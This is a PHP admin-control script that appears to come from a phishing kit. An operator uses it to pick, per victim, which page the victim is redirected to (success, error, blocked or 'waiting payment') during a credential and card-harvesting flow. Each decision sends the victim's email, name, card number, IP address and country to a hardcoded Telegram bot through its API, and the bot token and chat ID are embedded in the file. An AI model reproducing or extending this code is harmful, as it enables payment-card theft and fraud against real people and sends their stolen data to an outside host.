<?php
session_start();
if (!isset($_SESSION['admin_loggedin']) || $_SESSION['admin_loggedin'] !== true) {
    header('Location: login.php');
    exit;
}

$db_file = 'data/users.db';

if (isset($_GET['id'], $_GET['decision'])) {
    $user_id = $_GET['id'];
    $decision = $_GET['decision'];
    
    if (!file_exists($db_file)) {
        header('Location: dashboard.php?error=db_not_found');
        exit;
    }
    
    $users = json_decode(file_get_contents($db_file), true) ?: [];
    
    if (!isset($users[$user_id])) {
        header('Location: dashboard.php?error=user_not_found');
        exit;
    }
    
    // Handle decisions - FIXED: Keep status as 'loading' so buttons stay visible
    switch ($decision) {
        case 'success':
            // DON'T change status to 'success' - keep as 'loading'
            $users[$user_id]['redirect_to'] = 'success.php';
            $action_name = 'SUCCESS';
            break;
            
        case 'error':
            // DON'T change status to 'error' - keep as 'loading'
            $users[$user_id]['redirect_to'] = 'error.php';
            $action_name = 'ERROR';
            break;
            
        case 'block':
            // DON'T change status to 'blocked' - keep as 'loading'
            $users[$user_id]['redirect_to'] = 'blocked.php';
            $action_name = 'BLOCKED';
            break;
            
        case 'waiting':
            // DON'T change status to 'waiting_pay' - keep as 'loading'
            $users[$user_id]['redirect_to'] = 'waitingPay.php';
            $action_name = 'WAITING PAYMENT';
            break;
            
        default:
            $action_name = 'UNKNOWN';
            break;
    }
    
    $users[$user_id]['last_updated'] = time();
    $users[$user_id]['last_seen'] = time(); // Update last seen
    
    // Add to history
    $users[$user_id]['history'][] = [
        'time' => time(),
        'action' => 'admin_decision',
        'decision' => $decision,
        'redirect_to' => $users[$user_id]['redirect_to']
    ];
    
    // Save changes
    file_put_contents($db_file, json_encode($users, JSON_PRETTY_PRINT));
    
    // Send Telegram notification
    $bot_token = '8519765168:AAEJk6HCHDQY5fYAa2GfR5mzMrUxeSGPbF8';
    $chat_id = '-5209514131';
    
    $message = "🎯 *ADMIN DECISION*\n\n";
    $message .= "🔑 *User ID:* `" . $user_id . "`\n";
    $message .= "📧 *Email:* `" . ($users[$user_id]['data']['email'] ?? 'N/A') . "`\n";
    $message .= "👤 *Name:* `" . ($users[$user_id]['data']['name'] ?? 'N/A') . "`\n";
    $message .= "💳 *Card:* `" . ($users[$user_id]['data']['card'] ?? 'N/A') . "`\n";
    $message .= "📍 *IP:* `" . ($users[$user_id]['ip'] ?? 'N/A') . "`\n";
    $message .= "🌍 *Country:* `" . ($users[$user_id]['country'] ?? 'N/A') . "`\n";
    $message .= "🎯 *Decision:* `" . $action_name . "`\n";
    $message .= "🕐 *Time:* " . date('H:i:s');
    
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => json_encode([
                'chat_id' => $chat_id,
                'text' => $message,
                'parse_mode' => 'Markdown'
            ]),
            'timeout' => 1
        ]
    ]);
    @file_get_contents($url, false, $context);
}

header('Location: dashboard.php');
exit;
?>
